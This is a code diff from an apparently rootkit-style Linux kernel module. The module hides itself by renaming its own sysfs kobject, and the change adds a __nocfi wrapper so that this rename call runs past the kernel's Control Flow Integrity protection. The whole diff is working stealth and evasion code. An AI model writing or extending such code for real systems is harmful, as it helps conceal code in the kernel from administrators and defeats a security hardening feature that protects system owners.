@@ -23,6 +23,14 @@ static DEFINE_RWLOCK(rules_lock); // 读写锁，保证多核扫描安全
 static atomic_t hide_rule_count = ATOMIC_INIT(0);
 static DEFINE_MUTEX(module_visibility_lock);
 typedef int (*ls_kobject_rename_t)(struct kobject *kobj, const char *new_name);
+
+static noinline __nocfi int
+call_kobject_rename_nocfi(ls_kobject_rename_t fn, struct kobject *kobj,
+                          const char *new_name)
+{
+    return fn(kobj, new_name);
+}
+
 static struct mutex *hidden_module_mutex;
 static struct list_head *hidden_modules_head;
 static ls_kobject_rename_t hidden_kobject_rename;
@@ -122,8 +130,9 @@ void hide_myself(void)
         goto out;
 
     /* Renaming preserves the module's sysfs attributes for clean restoration. */
-    ret = hidden_kobject_rename(&THIS_MODULE->mkobj.kobj,
-                                LS_HIDDEN_SYSFS_NAME);
+    ret = call_kobject_rename_nocfi(hidden_kobject_rename,
+                                    &THIS_MODULE->mkobj.kobj,
+                                    LS_HIDDEN_SYSFS_NAME);
     if (ret)
         goto out;
 
@@ -151,7 +160,9 @@ int show_myself(void)
         goto out;
     }
 
-    ret = hidden_kobject_rename(&THIS_MODULE->mkobj.kobj, KBUILD_MODNAME);
+    ret = call_kobject_rename_nocfi(hidden_kobject_rename,
+                                    &THIS_MODULE->mkobj.kobj,
+                                    KBUILD_MODNAME);
     if (ret)
         goto out;
 
